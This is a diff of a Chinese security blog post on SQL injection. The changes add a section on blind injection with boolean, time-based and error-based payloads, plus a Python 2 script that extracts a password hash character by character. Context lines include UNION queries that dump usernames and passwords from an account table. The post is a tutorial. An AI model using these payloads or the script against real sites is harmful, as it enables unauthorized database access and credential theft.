@@ -6,14 +6,14 @@
   <title>SQL注入 | </title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="SQL注入分析介绍">
-<meta name="keywords" content="SQL注入介绍">
+<meta name="keywords" content="SQL注入介绍,SQL注入攻击,SQL注入盲注">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL注入">
 <meta property="og:url" content="https://Hussar118.github.io/2019/03/31/SQL注入/index.html">
 <meta property="og:site_name">
 <meta property="og:description" content="SQL注入分析介绍">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-03-31T16:31:08.455Z">
+<meta property="og:updated_time" content="2019-04-01T11:33:41.457Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL注入">
 <meta name="twitter:description" content="SQL注入分析介绍">
@@ -147,7 +147,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/CSRF漏洞/" style="font-size: 10px;">CSRF漏洞</a> <a href="/tags/Cookie/" style="font-size: 10px;">Cookie</a> <a href="/tags/DNS-rebinding攻击/" style="font-size: 10px;">DNS rebinding攻击</a> <a href="/tags/DNS服务器/" style="font-size: 10px;">DNS服务器</a> <a href="/tags/HTTP-REFERER/" style="font-size: 10px;">HTTP_REFERER</a> <a href="/tags/HTTP代理/" style="font-size: 10px;">HTTP代理</a> <a href="/tags/NAT网络地址转换/" style="font-size: 10px;">NAT网络地址转换</a> <a href="/tags/SQL注入介绍/" style="font-size: 10px;">SQL注入介绍</a> <a href="/tags/SQL注入漏洞/" style="font-size: 10px;">SQL注入漏洞</a> <a href="/tags/SSL安全套接层/" style="font-size: 10px;">SSL安全套接层</a> <a href="/tags/SSRF漏洞/" style="font-size: 10px;">SSRF漏洞</a> <a href="/tags/Session/" style="font-size: 10px;">Session</a> <a href="/tags/TTL生存时间值/" style="font-size: 10px;">TTL生存时间值</a> <a href="/tags/VPN虚拟专用网络/" style="font-size: 10px;">VPN虚拟专用网络</a> <a href="/tags/VWmare/" style="font-size: 10px;">VWmare</a> <a href="/tags/WAF绕过/" style="font-size: 10px;">WAF绕过</a> <a href="/tags/Windows常用系统命令和功能/" style="font-size: 10px;">Windows常用系统命令和功能</a> <a href="/tags/XFF-X-Forwarded-For/" style="font-size: 10px;">XFF(X-Forwarded-For)</a> <a href="/tags/XML注入攻击/" style="font-size: 10px;">XML注入攻击</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/XXS漏洞/" style="font-size: 10px;">XXS漏洞</a> <a href="/tags/hackbar/" style="font-size: 10px;">hackbar</a> <a href="/tags/kali/" style="font-size: 10px;">kali</a> <a href="/tags/linux常用系统命令和功能/" style="font-size: 10px;">linux常用系统命令和功能</a> <a href="/tags/payload/" style="font-size: 10px;">payload</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/url重定向攻击/" style="font-size: 10px;">url重定向攻击</a> <a href="/tags/webshell/" style="font-size: 10px;">webshell</a> <a href="/tags/whois/" style="font-size: 10px;">whois</a> <a href="/tags/一句话木马/" style="font-size: 10px;">一句话木马</a> <a href="/tags/三种网络模式/" style="font-size: 10px;">三种网络模式</a> <a href="/tags/中国菜刀/" style="font-size: 10px;">中国菜刀</a> <a href="/tags/信息搜集/" style="font-size: 10px;">信息搜集</a> <a href="/tags/信息泄露类漏洞/" style="font-size: 10px;">信息泄露类漏洞</a> <a href="/tags/加密/" style="font-size: 10px;">加密</a> <a href="/tags/勒索软件/" style="font-size: 10px;">勒索软件</a> <a href="/tags/命令注入漏洞/" style="font-size: 10px;">命令注入漏洞</a> <a href="/tags/大马/" style="font-size: 10px;">大马</a> <a href="/tags/子网掩码/" style="font-size: 10px;">子网掩码</a> <a href="/tags/提权/" style="font-size: 10px;">提权</a> <a href="/tags/文件上传漏洞/" style="font-size: 10px;">文件上传漏洞</a> <a href="/tags/日志审计/" style="font-size: 10px;">日志审计</a> <a href="/tags/暴力破解/" style="font-size: 10px;">暴力破解</a> <a href="/tags/渗透测试介绍/" style="font-size: 10px;">渗透测试介绍</a> <a href="/tags/系统和软件更新/" style="font-size: 10px;">系统和软件更新</a> <a href="/tags/虚拟机快照/" style="font-size: 10px;">虚拟机快照</a> <a href="/tags/远程代码执行漏洞/" style="font-size: 10px;">远程代码执行漏洞</a> <a href="/tags/默认网关/" style="font-size: 10px;">默认网关</a>
+                        <a href="/tags/CSRF漏洞/" style="font-size: 10px;">CSRF漏洞</a> <a href="/tags/Cookie/" style="font-size: 10px;">Cookie</a> <a href="/tags/DNS-rebinding攻击/" style="font-size: 10px;">DNS rebinding攻击</a> <a href="/tags/DNS服务器/" style="font-size: 10px;">DNS服务器</a> <a href="/tags/HTTP-REFERER/" style="font-size: 10px;">HTTP_REFERER</a> <a href="/tags/HTTP代理/" style="font-size: 10px;">HTTP代理</a> <a href="/tags/NAT网络地址转换/" style="font-size: 10px;">NAT网络地址转换</a> <a href="/tags/SQL注入介绍/" style="font-size: 10px;">SQL注入介绍</a> <a href="/tags/SQL注入攻击/" style="font-size: 10px;">SQL注入攻击</a> <a href="/tags/SQL注入漏洞/" style="font-size: 10px;">SQL注入漏洞</a> <a href="/tags/SQL注入盲注/" style="font-size: 10px;">SQL注入盲注</a> <a href="/tags/SSL安全套接层/" style="font-size: 10px;">SSL安全套接层</a> <a href="/tags/SSRF漏洞/" style="font-size: 10px;">SSRF漏洞</a> <a href="/tags/Session/" style="font-size: 10px;">Session</a> <a href="/tags/TTL生存时间值/" style="font-size: 10px;">TTL生存时间值</a> <a href="/tags/VPN虚拟专用网络/" style="font-size: 10px;">VPN虚拟专用网络</a> <a href="/tags/VWmare/" style="font-size: 10px;">VWmare</a> <a href="/tags/WAF绕过/" style="font-size: 10px;">WAF绕过</a> <a href="/tags/Windows常用系统命令和功能/" style="font-size: 10px;">Windows常用系统命令和功能</a> <a href="/tags/XFF-X-Forwarded-For/" style="font-size: 10px;">XFF(X-Forwarded-For)</a> <a href="/tags/XML注入攻击/" style="font-size: 10px;">XML注入攻击</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/XXS漏洞/" style="font-size: 10px;">XXS漏洞</a> <a href="/tags/hackbar/" style="font-size: 10px;">hackbar</a> <a href="/tags/kali/" style="font-size: 10px;">kali</a> <a href="/tags/linux常用系统命令和功能/" style="font-size: 10px;">linux常用系统命令和功能</a> <a href="/tags/payload/" style="font-size: 10px;">payload</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/url重定向攻击/" style="font-size: 10px;">url重定向攻击</a> <a href="/tags/webshell/" style="font-size: 10px;">webshell</a> <a href="/tags/whois/" style="font-size: 10px;">whois</a> <a href="/tags/一句话木马/" style="font-size: 10px;">一句话木马</a> <a href="/tags/三种网络模式/" style="font-size: 10px;">三种网络模式</a> <a href="/tags/中国菜刀/" style="font-size: 10px;">中国菜刀</a> <a href="/tags/信息搜集/" style="font-size: 10px;">信息搜集</a> <a href="/tags/信息泄露类漏洞/" style="font-size: 10px;">信息泄露类漏洞</a> <a href="/tags/加密/" style="font-size: 10px;">加密</a> <a href="/tags/勒索软件/" style="font-size: 10px;">勒索软件</a> <a href="/tags/命令注入漏洞/" style="font-size: 10px;">命令注入漏洞</a> <a href="/tags/大马/" style="font-size: 10px;">大马</a> <a href="/tags/子网掩码/" style="font-size: 10px;">子网掩码</a> <a href="/tags/提权/" style="font-size: 10px;">提权</a> <a href="/tags/文件上传漏洞/" style="font-size: 10px;">文件上传漏洞</a> <a href="/tags/日志审计/" style="font-size: 10px;">日志审计</a> <a href="/tags/暴力破解/" style="font-size: 10px;">暴力破解</a> <a href="/tags/渗透测试介绍/" style="font-size: 10px;">渗透测试介绍</a> <a href="/tags/系统和软件更新/" style="font-size: 10px;">系统和软件更新</a> <a href="/tags/虚拟机快照/" style="font-size: 10px;">虚拟机快照</a> <a href="/tags/远程代码执行漏洞/" style="font-size: 10px;">远程代码执行漏洞</a> <a href="/tags/默认网关/" style="font-size: 10px;">默认网关</a>
                     </div>
                 </section>
                 
@@ -255,7 +255,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL注入介绍/">SQL注入介绍</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL注入介绍/">SQL注入介绍</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL注入攻击/">SQL注入攻击</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL注入盲注/">SQL注入盲注</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -265,14 +265,14 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <center><font color="#4094C7" size="4">SQL注入介绍</font></center>
+        <center><font color="#4094C7" size="4">SQL注入超详细分析介绍</font></center>
 
 <h1 id="SQL注入介绍"><a href="#SQL注入介绍" class="headerlink" title="SQL注入介绍"></a><font color="#3399FF">SQL注入介绍</font></h1><hr>
 <ol>
 <li>Sql介绍：Sql是一种解释型语言，在运行时是由一个组件解释语言代码并执行其中包含指令的语言。而这种执行方式产生了SQL注入漏洞。</li>
 <li>产生原因：Web服务器在执行数据查找的Sql语句时，该语句由程序员编写的代码和用户提交的数据拼接组成。而程序员在web开发时，没有过滤敏感字符，绑定变量，导致攻击者可以通过Sql灵活多变的语法，<font color="#66FFFF">构造精心巧妙的语句</font>，不择手段，达成目的，或者通过系统报错，返回对自己有用的信息。</li>
 </ol>
-<h1 id="SQL注入攻击利用"><a href="#SQL注入攻击利用" class="headerlink" title="SQL注入攻击利用"></a><font color="#3399FF">SQL注入攻击利用</font></h1><hr>
+<h1 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a><font color="#3399FF">SQL注入攻击</font></h1><hr>
 <ol>
 <li>SQL注入点判断(一般存在形式：<font color="#66FFFF">/abc.asp?id=XX</font>)：<ul>
 <li>如果URL中传递的参数(一般为id)是数字，测试<font color="#66FFFF">id=2-1</font>与<font color="#66FFFF">id=1</font>返回的结果是否相同，如果做了2-1=1的运算，说明可能存在<font color="#66FFFF">数字型注入</font>。如果要用<font color="#66FFFF">+号</font>运算的话，因为URL编码的问题，需要把加好换成<font color="#66FFFF">%2B</font>，如<font color="#66FFFF">id=1%2B1</font>。</li>
@@ -295,7 +295,7 @@
 <li><font color="#66FFFF">/* </font>是MySQL中的注释符，返回错误说明该注入点不是MySQL，继续提交如下查询字符;</li>
 <li><font color="#66FFFF">– </font>是Oracle和MSSQL支持的注释符，如果返回正常，则说明为这两种数据库类型之一。继续提交如下查询字符;</li>
 <li><font color="#66FFFF">;  </font>是子句查询标识符，Oracle不支持多行查询，因此如果返回错误，则说明很可能是Oracle数据库。</li>
-<li><font color="#66FFFF">and exists (select count( <em> ) from sysobjects)</em></font>：意思是查询sysobjects表里记录数大于,返回正常的，说明大于0且存在sysobjects这个表，因为这个表只有MSSQL数据库才有，所以可以判断为MSSQL数据库。返回错误则表示不是。<font color="#66FFFF">and exists (select count(  ) from msysobjects)</font>：这句提交是不会返回正常页面的，就算是ACCESS数据库也不会返回正常。因为默认情况下我们没有权限查询这个表里的数据。WEB会提示我们“记录无法读取;’msysobjects’没有读取权限”，如果返回的是这个错误信息的话，那就证明是ACCESS数据库了。第一条返回正常，就是MSSQL数据库，如果两条都不正常，那就是ACCESS数据库了。以上参数都是int的时候，如果是字符型的话首先在参数后面加上单引号，然后再在查询语句后加上;–</li>
+<li><font color="#66FFFF">and exists (select count( 星号 ) from sysobjects)</font>：意思是查询sysobjects表里记录数大于,返回正常的，说明大于0且存在sysobjects这个表，因为这个表只有MSSQL数据库才有，所以可以判断为MSSQL数据库。返回错误则表示不是。<font color="#66FFFF">and exists (select count( 星号 ) from msysobjects)</font>：这句提交是不会返回正常页面的，就算是ACCESS数据库也不会返回正常。因为默认情况下我们没有权限查询这个表里的数据。WEB会提示我们“记录无法读取;’msysobjects’没有读取权限”，如果返回的是这个错误信息的话，那就证明是ACCESS数据库了。第一条返回正常，就是MSSQL数据库，如果两条都不正常，那就是ACCESS数据库了。以上参数都是int的时候，如果是字符型的话首先在参数后面加上单引号，然后再在查询语句后加上;–</li>
 </ul>
 </li>
 <li>基于显示错误信息判断：<br>  -注入点后直接加上<font color="#66FFFF">单引号</font>，根据服务器的报错信息来判断数据库。错误提示Microsoft JET Database Engine 错误 ‘80040e14’，说明是通过JET引擎连接数据库，则表明数据库为ACCESS数据库，如果是ODBC的话则说明是MSSQL数据库。</li>
@@ -313,6 +313,26 @@
 <li><font color="#66FFFF">xxx.php?id=2900 and 1=2 union select 1,2,3,4,5,group_concat(column_name),7,8,9,10,11,12,13,14 from information_schema.columns where table_name=0x6163636f756e74</font>：暴出account表中的所有字段名。</li>
 <li><font color="#66FFFF">xxx.php?id=2900 and 1=2 union select 1,2,3,4,5,group_concat(username,0x5e,password),7,8,9,10,11,12,13,14 from account</font>：暴出username和password字段里的内容。</li>
 </ul>
+</li>
+</ol>
+<h1 id="SQL注入盲注"><a href="#SQL注入盲注" class="headerlink" title="SQL注入盲注"></a><font color="#3399FF">SQL注入盲注</font></h1><hr>
+<ol>
+<li><p>盲注介绍：在SQL注入过程中，构造Sql语句执行后，数据无法返回到前端页面，我们根据返回页面的不同类型来判断信息(可能是页面内容不同，也可以是响应时间不同)。</p>
+</li>
+<li><p>盲注类型：<font color="#66FFFF">基于布尔SQL盲注</font>、<font color="#66FFFF">基于时间的SQL盲注</font>、<font color="#66FFFF">基于报错的SQL盲注</font>。</p>
+<ol>
+<li>基于布尔的SQL盲注：最长接触到的普通盲注，比如<font color="#66FFFF">where语句中构造or 1=1</font>来使返回页面不同。如果注入点在<font color="#66FFFF">order by</font>后面，那么则可以使用判断语句来构造报错。</li>
+<li>基于时间的SQL盲注：<font color="#66FFFF">select 1 from te where if(1=1,sleep(1),1) limit 0,1;</font>和<font color="#66FFFF">select 1 from te where if(1=2,sleep(1),1) limit 0,1;</font></li>
+<li>基于报错的SQL盲注：如果页面上显示数据的报错信息，那么可以直接使用报错的方式把想要的信息爆出来。比如mysql中经典报错：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+<li><p>暴力猜解(一般都是暴力猜解每一位ascii码，有些加快的方法)：</p>
+<ol>
+<li>字频统计：根据英文字母出现频率猜测,出现最多的先来。</li>
+<li>二分查找，位运算法：把试探字符串的次数降低到log(n) x length (n为可能字符的数量)<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#二分查找的python源代码(针对32位hash的盲注)</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">doinject</span><span class="params">(payload)</span>:</span></span><br><span class="line">    url = <span class="string">'xxxxxxxxxxxxxxxxxxxxx'</span></span><br><span class="line">    values = &#123;<span class="string">'injection'</span>:payload,<span class="string">'inject'</span>:<span class="string">'Inject'</span>&#125;</span><br><span class="line">    data = urllib.urlencode(values)</span><br><span class="line">    <span class="comment">#print data</span></span><br><span class="line">    req = urllib2.Request(url, data)</span><br><span class="line">    req.add_header(<span class="string">'cookie'</span>,<span class="string">'xx=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'</span>)</span><br><span class="line">    response = urllib2.urlopen(req)</span><br><span class="line">    the_page = response.read()</span><br><span class="line">    <span class="keyword">if</span> (the_page.find(<span class="string">"Welcome back"</span>)&gt;<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    </span><br><span class="line">wordlist = <span class="string">"0123456789ABCDEF"</span></span><br><span class="line">res = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    s=<span class="number">0</span></span><br><span class="line">    t=<span class="number">15</span></span><br><span class="line">    <span class="keyword">while</span> (s&lt;t):</span><br><span class="line">        <span class="keyword">if</span> (t-s==<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> doinject(<span class="string">'\' or substring(password,'</span>+str(i)+<span class="string">',1)=\''</span>+wordlist[t]+<span class="string">'\' -- LanLan'</span>):</span><br><span class="line">                m=t</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                m=s</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        m=(s+t)/<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> doinject(<span class="string">'\' or substring(password,'</span>+str(i)+<span class="string">',1)&gt;\''</span>+wordlist[m]+<span class="string">'\' -- LanLan'</span>):</span><br><span class="line">            s=m+<span class="number">1</span></span><br><span class="line">            <span class="keyword">print</span> wordlist[s]+<span class="string">":"</span>+wordlist[t]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            t=m</span><br><span class="line">            <span class="keyword">print</span> wordlist[s]+<span class="string">":"</span>+wordlist[t]</span><br><span class="line">    res = res+wordlist[m]</span><br><span class="line">    <span class="keyword">print</span> res</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
 </li>
 </ol>
 <h1 id="未完待续……"><a href="#未完待续……" class="headerlink" title=" 未完待续…… "></a><font color="#3399FF"> 未完待续…… </font></h1>
@@ -373,7 +393,7 @@
         <p><span>本文标题:</span><a href="/2019/03/31/SQL注入/">SQL注入</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Hussar 的个人博客">Hussar</a></p>
         <p><span>发布时间:</span>2019年03月31日 - 22时33分</p>
-        <p><span>最后更新:</span>2019年04月01日 - 00时31分</p>
+        <p><span>最后更新:</span>2019年04月01日 - 19时33分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2019/03/31/SQL注入/" title="SQL注入">https://Hussar118.github.io/2019/03/31/SQL注入/</a>
             <span class="copy-path" data-clipboard-text="原文: https://Hussar118.github.io/2019/03/31/SQL注入/　　作者: Hussar" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -402,7 +422,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL注入介绍"><span class="toc-number">1.</span> <span class="toc-text">SQL注入介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL注入攻击利用"><span class="toc-number">2.</span> <span class="toc-text">SQL注入攻击利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#未完待续……"><span class="toc-number">3.</span> <span class="toc-text"> 未完待续…… </span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL注入介绍"><span class="toc-number">1.</span> <span class="toc-text">SQL注入介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL注入攻击"><span class="toc-number">2.</span> <span class="toc-text">SQL注入攻击</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL注入盲注"><span class="toc-number">3.</span> <span class="toc-text">SQL注入盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#未完待续……"><span class="toc-number">4.</span> <span class="toc-text"> 未完待续…… </span></a></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
 
